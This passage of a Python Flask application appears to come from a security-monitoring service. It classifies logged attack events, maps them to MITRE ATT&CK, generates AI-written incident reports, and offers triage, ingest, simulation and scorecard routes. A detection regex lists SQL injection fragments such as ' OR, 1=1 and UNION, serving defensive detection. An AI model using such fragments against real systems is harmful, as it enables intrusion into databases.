            events["register"].append(record)
        elif etype == "XSS_ATTEMPT":
            record["payload"] = row["extra"]
            events["xss_attempt"].append(record)
        elif etype == "DIRECTORY_TRAVERSAL":
            record["path"] = row["extra"]
            events["directory_traversal"].append(record)
        elif etype == "PRIV_ESC_ATTEMPT":
            record["route"] = row["extra"]
            events["priv_esc_attempt"].append(record)
        elif etype == "ACCOUNT_ENUM":
            events["account_enum"].append(record)
    if db_rows:
        # Mark processed — keep for the live event feed history, never delete
        if owner_id is not None:
            db_run(
                f"UPDATE security_events SET processed = {PH} WHERE processed = {PH} AND owner_id = {PH}",
                (1, 0, owner_id),
            )
        else:
            db_run(
                f"UPDATE security_events SET processed = {PH} WHERE processed = {PH} AND owner_id IS NULL",
                (1, 0),
            )

    # No events at all — nothing to analyse
    if not db_rows and not log_path:
        return {"status": "ok", "threats_found": 0, "event_count": 0,
                "report_id": None, "message": "No events found. Run Simulate Attack first."}

    # MITRE ATT&CK mapping — used in threat objects and AI prompt
    MITRE_MAP = {
        "BRUTE_FORCE": {
            "id": "T1110", "name": "Brute Force",
            "tactic": "Credential Access",
        },
        "SQL_INJECTION_ATTEMPT": {
            "id": "T1190", "name": "Exploit Public-Facing Application",
            "tactic": "Initial Access",
        },
        "XSS_ATTEMPT": {
            "id": "T1059.007", "name": "JavaScript (Cross-Site Scripting)",
            "tactic": "Execution",
        },
        "DIRECTORY_TRAVERSAL": {
            "id": "T1083", "name": "File and Directory Discovery",
            "tactic": "Discovery",
        },
        "PASSWORD_SPRAY": {
            "id": "T1110.003", "name": "Password Spraying",
            "tactic": "Credential Access",
        },
        "CREDENTIAL_STUFFING": {
            "id": "T1110.004", "name": "Credential Stuffing",
            "tactic": "Credential Access",
        },
        "PRIVILEGE_ESCALATION": {
            "id": "T1548", "name": "Abuse Elevation Control Mechanism",
            "tactic": "Privilege Escalation",
        },
        "ACCOUNT_ENUMERATION": {
            "id": "T1589.001", "name": "Gather Victim Identity Information",
            "tactic": "Reconnaissance",
        },
        "SUSPICIOUS_LOGIN": {
            "id": "T1078", "name": "Valid Accounts",
            "tactic": "Defense Evasion",
        },
    }

    # Threat detection
    BRUTE_THRESHOLD = 3
    injection_re    = re.compile(r"(?i)(' OR|' AND|--|'=|1=1|UNION|SELECT|DROP)")
    threats         = []

    failed_by_user = defaultdict(list)
    for e in events["login_failed"]:
        failed_by_user[e.get("username", "unknown")].append(e)

    for uname, attempts in failed_by_user.items():
        if len(attempts) > BRUTE_THRESHOLD:
            success = any(e.get("username") == uname for e in events["login_success"])
            threats.append({
                "type": "BRUTE_FORCE", "severity": "HIGH",
                "username": uname, "failed_attempts": len(attempts),
                "ip": attempts[0].get("ip", "unknown"), "succeeded": success,
                "first_seen": attempts[0]["timestamp"],
                "last_seen":  attempts[-1]["timestamp"],
                "mitre": MITRE_MAP["BRUTE_FORCE"],
            })

    for e in events["search"]:
        query = e.get("query", "")
        if injection_re.search(query):
            threats.append({
                "type": "SQL_INJECTION_ATTEMPT", "severity": "HIGH",
                "username": e.get("username", "unknown"),
                "query": query, "ip": e.get("ip", "unknown"),
                "timestamp": e["timestamp"],
                "mitre": MITRE_MAP["SQL_INJECTION_ATTEMPT"],
            })

    # XSS detection — any XSS_ATTEMPT event is a threat
    for e in events["xss_attempt"]:
        threats.append({
            "type": "XSS_ATTEMPT", "severity": "HIGH",
            "username": e.get("username", "unknown"),
            "payload": e.get("payload", ""),
            "ip": e.get("ip", "unknown"),
            "timestamp": e["timestamp"],
            "mitre": MITRE_MAP["XSS_ATTEMPT"],
        })

    # Directory traversal — group by IP
    traversal_by_ip = defaultdict(list)
    for e in events["directory_traversal"]:
        traversal_by_ip[e.get("ip", "unknown")].append(e)
    for ip_addr, attempts in traversal_by_ip.items():
        threats.append({
            "type": "DIRECTORY_TRAVERSAL", "severity": "MEDIUM",
            "username": attempts[0].get("username", "unknown"),
            "paths": [e.get("path", "") for e in attempts],
            "attempts": len(attempts),
            "ip": ip_addr,
            "first_seen": attempts[0]["timestamp"],
            "last_seen":  attempts[-1]["timestamp"],
            "mitre": MITRE_MAP["DIRECTORY_TRAVERSAL"],
        })

    # Privilege escalation — group by username
    priv_esc_by_user = defaultdict(list)
    for e in events["priv_esc_attempt"]:
        priv_esc_by_user[e.get("username", "unknown")].append(e)
    for uname, attempts in priv_esc_by_user.items():
        threats.append({
            "type": "PRIVILEGE_ESCALATION", "severity": "HIGH",
            "username": uname,
            "routes": [e.get("route", "") for e in attempts],
            "attempts": len(attempts),
            "ip": attempts[0].get("ip", "unknown"),
            "timestamp": attempts[0]["timestamp"],
            "mitre": MITRE_MAP["PRIVILEGE_ESCALATION"],
        })

    # Account enumeration — same IP probing many usernames
    enum_by_ip = defaultdict(list)
    for e in events["account_enum"]:
        enum_by_ip[e.get("ip", "unknown")].append(e)
    for ip_addr, attempts in enum_by_ip.items():
        if len(attempts) >= 4:
            threats.append({
                "type": "ACCOUNT_ENUMERATION", "severity": "MEDIUM",
                "ip": ip_addr,
                "usernames_probed": len(attempts),
                "first_seen": attempts[0]["timestamp"],
                "last_seen":  attempts[-1]["timestamp"],
                "mitre": MITRE_MAP["ACCOUNT_ENUMERATION"],
            })

    # Password spray — same IP, low failures per account, sprayed_password in extra
    spray_by_ip = defaultdict(set)
    for e in events["login_failed"]:
        if "sprayed_password=" in e.get("extra", ""):
            spray_by_ip[e.get("ip", "unknown")].add(e.get("username", "unknown"))
    for ip_addr, accounts in spray_by_ip.items():
        if len(accounts) >= 4:
            threats.append({
                "type": "PASSWORD_SPRAY", "severity": "HIGH",
                "ip": ip_addr,
                "accounts_targeted": len(accounts),
                "mitre": MITRE_MAP["PASSWORD_SPRAY"],
            })

    # Credential stuffing — same IP, many DIFFERENT accounts failing (without spray marker)
    stuff_by_ip = defaultdict(set)
    for e in events["login_failed"]:
        if "sprayed_password=" not in e.get("extra", ""):
            stuff_by_ip[e.get("ip", "unknown")].add(e.get("username", "unknown"))
    for ip_addr, accounts in stuff_by_ip.items():
        if len(accounts) >= 4:
            successes = [s for s in events["login_success"] if s.get("ip") == ip_addr]
            threats.append({
                "type": "CREDENTIAL_STUFFING",
                "severity": "CRITICAL" if successes else "HIGH",
                "ip": ip_addr,
                "accounts_targeted": len(accounts),
                "succeeded": bool(successes),
                "mitre": MITRE_MAP["CREDENTIAL_STUFFING"],
            })

    # Suspicious login — login_success with unusual marker in extra
    for e in events["login_success"]:
        extra = e.get("extra", "")
        if "unusual_hour=true" in extra or "new_ip=true" in extra:
            threats.append({
                "type": "SUSPICIOUS_LOGIN", "severity": "MEDIUM",
                "username": e.get("username", "unknown"),
                "ip": e.get("ip", "unknown"),
                "timestamp": e["timestamp"],
                "mitre": MITRE_MAP["SUSPICIOUS_LOGIN"],
            })

    threat_count = len(threats)
    event_count  = sum(len(v) for v in events.values())

    # Enrich attacker IPs with AbuseIPDB reputation data
    threats = _enrich_threats_with_ip_reputation(threats)

    # Generate report content — Ollama (local) → Anthropic (cloud) → basic markdown
    content = None
    if threat_count > 0:
        try:
            summary = {
                "total_events": event_count,
                "failed_logins": len(events["login_failed"]),
                "successful_logins": len(events["login_success"]),
                "searches": len(events["search"]),
                "xss_attempts": len(events["xss_attempt"]),
                "directory_traversals": len(events["directory_traversal"]),
                "priv_esc_attempts": len(events["priv_esc_attempt"]),
                "account_enum_events": len(events["account_enum"]),
                "threats_detected": threat_count,
                "threats": threats,
            }
            prompt = (
                "You are a senior SOC (Security Operations Centre) analyst writing a formal "
                "incident report for a client. Your audience is both the business owner "
                "(plain English) and the IT team (technical detail).\n\n"
                "Analyse the following threat data from a web application security monitoring "
                "system and produce a professional incident report.\n\n"
                f"Incident Data:\n{_json.dumps(summary, indent=2)}\n\n"
                "Write the report using exactly these sections:\n\n"
                "## Executive Summary\n"
                "2-3 sentences. What happened, the business impact, and the bottom line.\n\n"
                "## Attack Timeline\n"
                "Chronological bullet points of the attack sequence from first event to last.\n\n"
                "## Kill Chain Analysis\n"
                "IMPORTANT: Before writing individual threat sections, first determine whether "
                "the threats form a connected multi-stage attack chain. If two or more threats "
                "share the same attacker IP and follow a logical progression (e.g. enumeration → "
                "credential access → account takeover → privilege escalation), identify this as "
                "an APT (Advanced Persistent Threat) campaign and describe the full kill chain in "
                "one paragraph. State each phase, the MITRE technique, and how each phase enabled "
                "the next. If the threats are unrelated incidents, state that clearly and skip this section.\n\n"
                "## Threat Analysis\n"
                "One sub-section per threat. For each include:\n"
                "- Threat type and MITRE ATT&CK technique (use the ID and name from the data)\n"
                "- What the attacker did, in plain English\n"
                "- Whether the attack succeeded\n"
                "- Severity and potential business impact\n\n"
                "## Indicators of Compromise (IOCs)\n"
                "A markdown table with columns: Type | Value | Context\n"
                "Include all attacker IPs, targeted usernames, and malicious payloads observed.\n"
                "For any IP that has an ip_reputation field in the threat data, add a second row "
                "below it showing: Abuse Score (0-100), country, ISP, total prior reports, and "
                "whether it is a Tor exit node. If abuse_score >= 50, flag it as KNOWN MALICIOUS. "
                "If total_reports == 0 and it is a documentation/TEST-NET IP, note that.\n\n"
                "## Recommended Actions\n"
                "Prioritised bullet points split into:\n"
                "- **Immediate (0-24 hours)**\n"
                "- **Short-term (1-7 days)**\n"
                "- **Long-term hardening**\n\n"
                "## Remediation Timeline\n"
                "A realistic time estimate for each recommended action. "
                "Be honest — a business owner needs to know if this is a 30-minute fix or a two-week project. "
                "Format as a table with columns: Action | Estimated Time | Who Does It (Analyst / Developer / Business Owner)\n\n"
                "## What to Tell Your Customers\n"
                "This section is critical. Provide ready-to-use plain-English language for three audiences:\n"
                "- **Your customers / clients** — if any of their data may have been affected, what do you say? "
                "If no customer data was involved, state that clearly so the business owner knows they do not need to communicate externally.\n"
                "- **Your staff** — what do employees need to know and watch out for?\n"
                "- **Legal obligations** — does this incident trigger any notification requirements "
                "(e.g., GDPR, data protection authority, affected individuals)? "
                "Be direct about whether they likely need to notify anyone and within what timeframe. "
                "Note that you are not providing legal advice — recommend they confirm with a solicitor if required.\n\n"
                "## Overall Risk Level\n"
                "Critical / High / Medium / Low — one sentence justification.\n\n"
                "Format as clean markdown. Use tables where appropriate."
            )
            content = _generate_report_with_ai(prompt)
        except Exception as exc:
            security_log.warning(f"REPORT_GENERATION_FAILED error={exc}")
    if not content:
        failed_ct    = len(events["login_failed"])
        success_ct   = len(events["login_success"])
        search_ct    = len(events["search"])
        xss_ct       = len(events["xss_attempt"])
        traversal_ct = len(events["directory_traversal"])
        priv_esc_ct  = len(events["priv_esc_attempt"])
        enum_ct      = len(events["account_enum"])
        lines = [
            "# Incident Report\n", "---\n", "## Events Analysed\n",
            f"| Event type | Count |", f"|---|---|",
            f"| Failed login attempts | {failed_ct} |",
            f"| Successful logins | {success_ct} |",
            f"| Search / query events | {search_ct} |",
        ]
        if xss_ct:       lines.append(f"| XSS attempts | {xss_ct} |")
        if traversal_ct: lines.append(f"| Directory traversal | {traversal_ct} |")
        if priv_esc_ct:  lines.append(f"| Privilege escalation probes | {priv_esc_ct} |")
        if enum_ct:      lines.append(f"| Account enumeration | {enum_ct} |")
        lines += [f"| **Total** | **{event_count}** |", ""]

        SEVERITY_ICON = {"CRITICAL": "🔴", "HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢"}
        if threat_count > 0:
            lines.append(f"## Threats Detected: {threat_count}\n")
            for t in threats:
                icon = SEVERITY_ICON.get(t.get("severity", "HIGH"), "🔴")
                mitre_tag = f"{t['mitre']['id']} {t['mitre']['name']}"
                if t["type"] == "BRUTE_FORCE":
                    outcome = "✅ Account compromised" if t.get("succeeded") else "🛡 Access denied"
                    lines.append(
                        f"### {icon} Brute Force Attack — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **Target account:** {t['username']}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Failed attempts:** {t['failed_attempts']}\n"
                        f"- **Outcome:** {outcome}\n"
                        f"- **First seen:** {t['first_seen']} | **Last seen:** {t['last_seen']}\n"
                    )
                elif t["type"] == "SQL_INJECTION_ATTEMPT":
                    lines.append(
                        f"### {icon} SQL Injection Attempt — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **User:** {t.get('username','unknown')}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Payload:** `{t.get('query','')}`\n"
                        f"- **Timestamp:** {t.get('timestamp','')}\n"
                    )
                elif t["type"] == "XSS_ATTEMPT":
                    lines.append(
                        f"### {icon} Cross-Site Scripting (XSS) — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **User:** {t.get('username','unknown')}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Payload:** `{t.get('payload','')}`\n"
                        f"- **Timestamp:** {t.get('timestamp','')}\n"
                    )
                elif t["type"] == "DIRECTORY_TRAVERSAL":
                    lines.append(
                        f"### {icon} Directory Traversal — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Paths probed:** {t['attempts']}\n"
                        f"- **Sample path:** `{t['paths'][0] if t['paths'] else ''}`\n"
                        f"- **First seen:** {t['first_seen']} | **Last seen:** {t['last_seen']}\n"
                    )
                elif t["type"] == "PRIVILEGE_ESCALATION":
                    lines.append(
                        f"### {icon} Privilege Escalation — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **User:** {t['username']}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Routes probed:** {', '.join(t.get('routes', []))}\n"
                        f"- **Timestamp:** {t.get('timestamp','')}\n"
                    )
                elif t["type"] == "ACCOUNT_ENUMERATION":
                    lines.append(
                        f"### {icon} Account Enumeration — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Usernames probed:** {t['usernames_probed']}\n"
                        f"- **First seen:** {t['first_seen']} | **Last seen:** {t['last_seen']}\n"
                    )
                elif t["type"] == "PASSWORD_SPRAY":
                    lines.append(
                        f"### {icon} Password Spraying — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Accounts targeted:** {t['accounts_targeted']}\n"
                    )
                elif t["type"] == "CREDENTIAL_STUFFING":
                    outcome = "✅ At least one account compromised" if t.get("succeeded") else "🛡 No successful logins"
                    lines.append(
                        f"### {icon} Credential Stuffing — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **Attacker IP:** {t['ip']}\n"
                        f"- **Accounts targeted:** {t['accounts_targeted']}\n"
                        f"- **Outcome:** {outcome}\n"
                    )
                elif t["type"] == "SUSPICIOUS_LOGIN":
                    lines.append(
                        f"### {icon} Suspicious Login — {t['severity']}\n"
                        f"- **MITRE:** {mitre_tag}\n"
                        f"- **User:** {t['username']}\n"
                        f"- **IP:** {t['ip']}\n"
                        f"- **Timestamp:** {t.get('timestamp','')}\n"
                    )
            lines += ["---\n",
                      "> **Note:** AI report generation uses local Ollama by default "
                      "(http://localhost:11434 — ensure Ollama is running). "
                      "Set `ANTHROPIC_API_KEY` as a fallback for cloud-based generation."]
        else:
            lines += ["## No Threats Detected\n",
                      "The agent found no threat patterns in the current events.\n"]
        content = "\n".join(lines)

    # Save report — tagged with owner_id for multi-tenancy
    ts_expr = "NOW()" if DATABASE_URL else "datetime('now')"
    db_run(
        f"INSERT INTO reports (created_at, threat_count, event_count, content, owner_id)"
        f" VALUES ({ts_expr}, {PH}, {PH}, {PH}, {PH})",
        (threat_count, event_count, content, owner_id),
    )
    row       = db_fetchone("SELECT id FROM reports ORDER BY id DESC LIMIT 1")
    report_id = row["id"] if row else None

    security_log.info(
        f"AGENT_RUN threats_found={threat_count} report_id={report_id} "
        f"triggered_by={triggered_by}"
    )
    return {"status": "ok", "threats_found": threat_count,
            "event_count": event_count, "report_id": report_id}


# --- ROUTE 4c: Report Triage (analyst only) ---
@app.route("/reports/<int:report_id>/triage", methods=["POST"])
@analyst_required
def triage_report(report_id):
    """Update the triage status of a report. Analyst-only."""
    status = request.form.get("status", "new")
    if status not in ("new", "reviewing", "escalated", "closed"):
        abort(400)
    # Fetch current status before overwriting (needed for triage_log)
    current = db_fetchone(f"SELECT status FROM reports WHERE id = {PH}", (report_id,))
    old_status = current["status"] if current else "new"
    db_run(f"UPDATE reports SET status = {PH} WHERE id = {PH}", (status, report_id))
    # Record the status change in the triage log for scorecard metrics
    db_run(
        f"INSERT INTO triage_log (report_id, old_status, new_status) VALUES ({PH},{PH},{PH})",
        (report_id, old_status, status),
    )
    flash(f"Report #{report_id} marked as {status.upper()}.", "success")
    # Return to wherever the analyst came from
    referrer = request.referrer or ""
    if "control-room" in referrer:
        return redirect(url_for("control_room"))
    return redirect(url_for("report_detail", report_id=report_id))


# --- ROUTE 4d: Investigation Notes (analyst only) ---
@app.route("/reports/<int:report_id>/notes", methods=["POST"])
@analyst_required
def save_notes(report_id):
    """Save analyst investigation notes on a report. Analyst-only."""
    notes = request.form.get("notes", "").strip()
    if DATABASE_URL:
        db_run(
            f"UPDATE reports SET analyst_notes = {PH}, notes_updated_at = NOW() WHERE id = {PH}",
            (notes, report_id),
        )
    else:
        db_run(
            f"UPDATE reports SET analyst_notes = {PH}, notes_updated_at = datetime('now') WHERE id = {PH}",
            (notes, report_id),
        )
    flash("Investigation notes saved.", "success")
    return redirect(url_for("report_detail", report_id=report_id))


# --- ROUTE 4e: Client Integration Page ---
@app.route("/integration")
@login_required
def integration():
    """
    Clients are redirected — Jason handles integration on their behalf.
    Analysts are redirected to the control room to pick a client.
    """
    if session.get("role") == "analyst":
        flash("Select a client from the control room to manage their integration.", "info")
        return redirect(url_for("control_room"))
    # Client or demo — integration is managed by the analyst
    flash(
        "Your analyst sets up and manages your integration. "
        "Contact jason.morgan@boundry.ai to get started.",
        "info",
    )
    return redirect(url_for("reports"))


@app.route("/analyst/client/<int:client_id>/integration")
@analyst_required
def analyst_integration(client_id):
    """
    Analyst-only: view and copy integration code pre-filled with a specific
    client's API key. Jason uses this to install monitoring on a client's app.
    """
    client = db_fetchone(
        f"SELECT id, username, api_key FROM users WHERE id = {PH} AND role = 'client'",
        (client_id,),
    )
    if not client:
        abort(404)

    # Generate a key if somehow missing
    if not client["api_key"]:
        import secrets as _secrets
        new_key = _secrets.token_urlsafe(32)
        db_run(f"UPDATE users SET api_key = {PH} WHERE id = {PH}", (new_key, client["id"]))
        client = dict(client)
        client["api_key"] = new_key

    ingest_url = request.url_root.rstrip("/") + "/api/ingest"
    return render_template(
        "integration.html",
        api_key=client["api_key"],
        ingest_url=ingest_url,
        client_username=client["username"],
        analyst_mode=True,
    )


# --- ROUTE 4f: Event Ingest API ---
@app.route("/api/ingest", methods=["POST"])
@limiter.limit("200 per minute")
def api_ingest():
    """
    Authenticated ingest endpoint for real client applications.
    Clients POST security events here using their API key.

    Trust boundary: X-API-Key header maps event to a specific owner_id.
    No session required — designed for server-to-server calls.

    POST /api/ingest
    X-API-Key: <client_api_key>
    Content-Type: application/json
    { "event_type": "LOGIN_FAILED", "username": "admin", "ip": "1.2.3.4", "extra": "" }
    """
    VALID_EVENT_TYPES = {
        "LOGIN_FAILED", "LOGIN_SUCCESS", "SEARCH", "REGISTER_SUCCESS",
        "XSS_ATTEMPT", "DIRECTORY_TRAVERSAL", "PRIV_ESC_ATTEMPT", "ACCOUNT_ENUM",
    }

    api_key = request.headers.get("X-API-Key", "").strip()
    if not api_key:
        return jsonify(error="Missing X-API-Key header"), 401

    user = db_fetchone(f"SELECT id FROM users WHERE api_key = {PH}", (api_key,))
    if not user:
        return jsonify(error="Invalid API key"), 401

    data = request.get_json(silent=True)
    if not data:
        return jsonify(error="Request body must be JSON"), 400

    event_type = str(data.get("event_type", "")).upper()
    if event_type not in VALID_EVENT_TYPES:
        return jsonify(error=f"Invalid event_type. Valid values: {sorted(VALID_EVENT_TYPES)}"), 400

    username = str(data.get("username", ""))[:100]
    ip       = str(data.get("ip", ""))[:45]
    extra    = str(data.get("extra", ""))[:500]

    db_run(
        f"INSERT INTO security_events (event_type, username, ip, extra, owner_id)"
        f" VALUES ({PH},{PH},{PH},{PH},{PH})",
        (event_type, username, ip, extra, user["id"]),
    )

    security_log.info(
        f"INGEST event_type={event_type} username={username} "
        f"ip={ip} owner_id={user['id']}"
    )
    return jsonify(status="ok", event_type=event_type), 201


# --- ROUTE 5: Attack Simulation (browser) ---
VALID_CHAINS = {
    "recon_to_takeover": "Recon → Credential Stuffing → Account Takeover → Priv Esc",
    "web_exploit_chain": "Brute Force → Login → XSS → SQL Injection → Traversal",
    "stealthy_apt":      "Password Spray → Suspicious Login → XSS → Priv Esc",
}

@app.route("/simulate-attack", methods=["POST"])
@login_required
def simulate_attack():
    """Browser-facing wrapper around _simulate_attack_core()."""
    chain = request.form.get("chain", "").strip()
    difficulty = request.form.get("difficulty", "medium")
    if difficulty not in ("easy", "medium", "hard"):
        difficulty = "medium"

    if chain and chain in VALID_CHAINS:
        count = _simulate_attack_core(owner_id=session.get("user_id"), chain=chain)
        label = VALID_CHAINS[chain]
        msg   = f"🔗 APT Chain queued: {label} — {count} events. Now click Run Agent."
    else:
        chain = None
        count = _simulate_attack_core(owner_id=session.get("user_id"), difficulty=difficulty)
        msg   = f"⚡ Attack simulation complete ({difficulty.upper()}) — {count} event(s) queued. Now click Run Agent."

    if "text/html" in request.accept_mimetypes:
        flash(msg, "info")
        dest = "control_room" if session.get("role") == "analyst" else "reports"
        return redirect(url_for(dest))
    return jsonify(status="ok", events_generated=count, chain=chain, difficulty=difficulty)


# --- ROUTE 6: Agent Trigger (browser) ---
@app.route("/run-agent", methods=["POST"])
@login_required
def run_agent():
    """Browser-facing wrapper around _run_agent_core()."""
    result = _run_agent_core(triggered_by=session.get("username", "unknown"), owner_id=session.get("user_id"))

    if "text/html" in request.accept_mimetypes:
        if result.get("report_id"):
            flash(
                f"🤖 Agent complete — {result['event_count']} events analysed, "
                f"{result['threats_found']} threat(s) detected. "
                f"Report #{result['report_id']} saved.",
                "success",
            )
        elif result.get("message"):
            flash(f"⚠️ {result['message']}", "warning")
        else:
            flash("🤖 Agent ran but found no threats in the current events.", "info")
        dest = "control_room" if session.get("role") == "analyst" else "reports"
        return redirect(url_for(dest))
    return jsonify(**result)


# --- ROUTE 7: Cron endpoint (no session — authenticated by CRON_SECRET header) ---
@app.route("/cron/run", methods=["POST"])
def cron_run():
    """
    Combined simulate + agent run for Railway's scheduled cron job.

    Trust boundary: requires X-Cron-Secret header matching the CRON_SECRET
    environment variable.  Returns 404 (not 403) if CRON_SECRET is unset so
    the route is invisible to scanners.

    Railway cron command:
        curl -s -X POST https://<your-app>/cron/run \\
             -H "X-Cron-Secret: $CRON_SECRET"
    """
    expected = os.environ.get("CRON_SECRET", "")
    provided = request.headers.get("X-Cron-Secret", "")
    if not expected or provided != expected:
        abort(404)

    # Run per client — each client gets their own simulated events and report
    clients = db_fetchall("SELECT id FROM users WHERE role = 'client'")
    total_events = 0
    total_threats = 0
    report_ids = []
    for client in clients:
        total_events += _simulate_attack_core(owner_id=client["id"])
        result = _run_agent_core(triggered_by="cron", owner_id=client["id"])
        total_threats += result.get("threats_found", 0)
        if result.get("report_id"):
            report_ids.append(result["report_id"])

    # Fallback: if no clients exist, run a system-level simulation
    if not clients:
        total_events = _simulate_attack_core(owner_id=None)
        result = _run_agent_core(triggered_by="cron", owner_id=None)
        total_threats = result.get("threats_found", 0)
        if result.get("report_id"):
            report_ids.append(result["report_id"])
        result = {"threats_found": total_threats, "report_id": report_ids[0] if report_ids else None}
    else:
        result = {"threats_found": total_threats, "report_id": report_ids[-1] if report_ids else None}

    security_log.info(
        f"CRON_RUN events_generated={total_events} clients={len(clients)} "
        f"threats_found={total_threats} report_ids={report_ids}"
    )
    return jsonify(
        status="ok",
        events_generated=total_events,
        clients_processed=len(clients),
        threats_found=total_threats,
        report_ids=report_ids,
    )


# --- ROUTE 8: Breach Intel Cron (no session — CRON_SECRET authenticated) ---
@app.route("/cron/breach-intel", methods=["POST"])
def cron_breach_intel():
    """
    Fetch latest breach reports from security RSS feeds and save to DB.
    Call this from cron-job.org every 6 hours.
    Auth: same X-Cron-Secret header as /cron/run.
    """
    expected = os.environ.get("CRON_SECRET", "")
    provided = request.headers.get("X-Cron-Secret", "")
    if not expected or provided != expected:
        abort(404)

    saved = _fetch_breach_intel()
    security_log.info(f"CRON_BREACH_INTEL saved={saved}")
    return jsonify(status="ok", new_items_saved=saved)


# --- ROUTE 8b: Manual Breach Intel Refresh (analyst only) ---
@app.route("/run-breach-intel", methods=["POST"])
@analyst_required
def run_breach_intel():
    """Analyst-triggered breach intel refresh. Same logic as cron, browser-accessible."""
    saved = _fetch_breach_intel()
    if saved > 0:
        flash(f"🔍 Threat intel updated — {saved} new item(s) added to the ticker.", "success")
    else:
        flash("🔍 No new breach reports found (feeds may not have updated yet).", "info")
    return redirect(url_for("control_room"))


@app.route("/scorecard")
@analyst_required
def scorecard():
    """Analyst performance scorecard — response times, escalation rate, notes discipline."""

    # ── Total reports and breakdown by status ────────────────────────────────
    all_reports = db_fetchall(
        "SELECT id, created_at, status, threat_count, analyst_notes, notes_updated_at FROM reports"
    )
    total = len(all_reports)
    by_status = {"new": 0, "reviewing": 0, "escalated": 0, "closed": 0}
    for r in all_reports:
        s = r.get("status", "new")
        by_status[s] = by_status.get(s, 0) + 1

    # ── Notes discipline ─────────────────────────────────────────────────────
    # Did Jason write notes before triaging? notes_updated_at < first triage action.
    # Simpler fallback: just track which reports have any notes at all.
    reports_with_notes = sum(1 for r in all_reports if (r.get("analyst_notes") or "").strip())
    notes_pct = round(reports_with_notes / total * 100) if total else 0

    # ── Triage log stats ─────────────────────────────────────────────────────
    triage_rows = db_fetchall(
        "SELECT report_id, old_status, new_status, changed_at FROM triage_log ORDER BY changed_at ASC"
    )

    # Time to first action: gap between report created_at and first triage log entry
    report_map = {r["id"]: r for r in all_reports}
    first_action_hours = []
    close_hours = []
    seen_first = set()

    for row in triage_rows:
        rid = row["report_id"]
        report = report_map.get(rid)
        if not report:
            continue
        try:
            created = datetime.fromisoformat(str(report["created_at"]).replace(" ", "T").rstrip("Z"))
            changed = datetime.fromisoformat(str(row["changed_at"]).replace(" ", "T").rstrip("Z"))
            diff_h  = (changed - created).total_seconds() / 3600
            if rid not in seen_first:
                first_action_hours.append(diff_h)
                seen_first.add(rid)
            if row["new_status"] == "closed":
                close_hours.append(diff_h)
        except Exception:
            pass

    def fmt_hours(h):
        if h < 1:
            return f"{int(h * 60)}m"
        return f"{h:.1f}h"

    avg_triage = fmt_hours(sum(first_action_hours) / len(first_action_hours)) if first_action_hours else "—"
    avg_close  = fmt_hours(sum(close_hours)        / len(close_hours))        if close_hours        else "—"

    # ── Escalation rate ───────────────────────────────────────────────────────
    escalated_count = by_status.get("escalated", 0)
    # Also count reports that passed through escalated (now closed)
    ever_escalated = len({r["report_id"] for r in triage_rows if r["new_status"] == "escalated"})
    esc_pct = round(ever_escalated / total * 100) if total else 0

    # ── Recent triage activity (last 15 actions) ──────────────────────────────
    recent = db_fetchall(
        "SELECT tl.report_id, tl.old_status, tl.new_status, tl.changed_at "
        "FROM triage_log tl ORDER BY tl.changed_at DESC LIMIT 15"
    )

    # ── Notes discipline detail: per-report notes vs triage timing ────────────
    discipline_rows = []
    first_triage_by_report = {}
    for row in triage_rows:
        rid = row["report_id"]
        if rid not in first_triage_by_report:
            first_triage_by_report[rid] = row["changed_at"]

    for r in sorted(all_reports, key=lambda x: x["created_at"], reverse=True)[:20]:
        rid = r["id"]
        has_notes = bool((r.get("analyst_notes") or "").strip())
        notes_ts  = r.get("notes_updated_at")
        triage_ts = first_triage_by_report.get(rid)
        if notes_ts and triage_ts:
            try:
                nt = datetime.fromisoformat(str(notes_ts).replace(" ", "T").rstrip("Z"))
                tt = datetime.fromisoformat(str(triage_ts).replace(" ", "T").rstrip("Z"))
                before = nt < tt
            except Exception:
                before = None
        else:
            before = None
        discipline_rows.append({
            "id": rid,
            "status": r.get("status", "new"),
            "has_notes": has_notes,
            "notes_before_triage": before,
            "threat_count": r.get("threat_count", 0),
        })

    return render_template(
        "scorecard.html",
        total=total,
        by_status=by_status,
        notes_pct=notes_pct,
        avg_triage=avg_triage,
        avg_close=avg_close,
        esc_pct=esc_pct,
        ever_escalated=ever_escalated,
        recent=recent,
        discipline_rows=discipline_rows,
        reports_with_notes=reports_with_notes,
    )


# ── CISSP study helpers ──────────────────────────────────────────────────────

def _generate_cissp_question(domain_num):
    """
    Use Ollama to generate a scenario-based CISSP practice question for the given domain.
    Returns a validated dict or None if generation fails.
    The correct answer is NOT returned to the browser — it stays server-side in the DB.
    """
    import json as _j
    import urllib.request as _urlreq

    domain = CISSP_DOMAINS.get(domain_num, {})
    if not domain:
        return None

    topics_str = ", ".join(domain.get("key_topics", []))
    prompt = f"""You are an expert ISC2 CISSP exam question writer.

Write ONE scenario-based practice question for CISSP Domain {domain_num}: {domain["name"]} ({domain["weight"]}% of exam).
Key topics for this domain: {topics_str}

Requirements:
1. Write a realistic 3–5 sentence workplace scenario for a senior security professional or manager.
2. Create exactly 4 answer options (A, B, C, D) — three plausible but wrong, one clearly the BEST from a security management perspective.
3. Apply core CISSP principles: least privilege, defence in depth, people → process → technology order, risk before controls, governance over tools, manager ensures the PROCESS is followed.
4. Frame the question as "What should you do FIRST?" or "What is the BEST course of action?" — CISSP always tests priority.
5. Classify the mindset this question tests: "manager" (governance/risk/policy decision) or "technical" (specific technical knowledge) or "both".

Respond ONLY with valid JSON — absolutely no other text, no markdown, no code fences:
